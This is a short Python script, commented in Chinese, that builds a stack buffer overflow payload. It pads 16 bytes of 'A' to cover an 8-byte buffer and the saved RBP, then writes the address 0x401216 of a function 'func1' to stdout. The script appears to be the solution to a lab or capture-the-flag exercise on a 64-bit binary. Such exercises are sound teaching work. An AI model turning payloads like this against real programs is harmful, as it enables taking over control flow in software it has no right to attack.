import sys
import struct

# 1. 构造 Padding
# 我们计算出 buffer(8) + saved_rbp(8) = 16 字节
padding = b'A' * 16

# 2. 构造目标地址 (Target Address)
# 目标是 func1 的地址: 0x401216
# <Q 代表 Little Endian (小端序) 的 Unsigned Long Long (8字节，因为是64位程序)
target_addr = struct.pack('<Q', 0x401216)

# 3. 拼接 Payload
payload = padding + target_addr

# 4. 写入标准输出 (供重定向使用)
sys.stdout.buffer.write(payload)